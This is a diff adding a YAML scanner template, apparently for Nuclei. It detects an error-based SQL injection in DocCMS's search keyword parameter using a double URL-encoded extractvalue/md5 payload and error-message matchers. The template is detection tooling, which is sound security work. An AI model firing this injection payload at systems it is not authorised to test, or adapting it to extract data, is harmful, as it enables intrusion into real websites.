@@ -1,0 +1,28 @@
+id: poc-yaml-doccms-keyword-sqli
+info:
+  name: DocCMS Keyword SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection, doccms
+  description: |
+    This template detects a potential SQL injection vulnerability in DocCMS's search functionality.
+
+variables:
+  t1: "{{rand_int(1, 10000)}}"
+  payload: "{{url_encode(url_encode(t1))}}"
+
+http:
+  - method: GET
+    path:
+      - "/search/index.php?keyword=1%25%32%37%25%32%30%25%36%31%25%36%65%25%36%34%25%32%30%25%32%38%25%36%35%25%37%38%25%37%34%25%37%32%25%36%31%25%36%33%25%37%34%25%37%36%25%36%31%25%36%63%25%37%35%25%36%35%25%32%38%25%33%31%25%32%63%25%36%33%25%36%66%25%36%65%25%36%33%25%36%31%25%37%34%25%32%38%25%33%30%25%37%38%25%33%37%25%36%35%25%32%63%25%32%38%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%36%64%25%36%34%25%33%35%25%32%38{{payload}}%25%32%39%25%32%39%25%32%63%25%33%30%25%37%38%25%33%37%25%36%35%25%32%39%25%32%39%25%32%39%25%32%33"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "XPATH syntax error"
+      - type: word
+        words:
+          - "数据库错误"
+      - type: dsl
+        dsl:
+          - contains(body, substr(md5(t1), 0, 31))
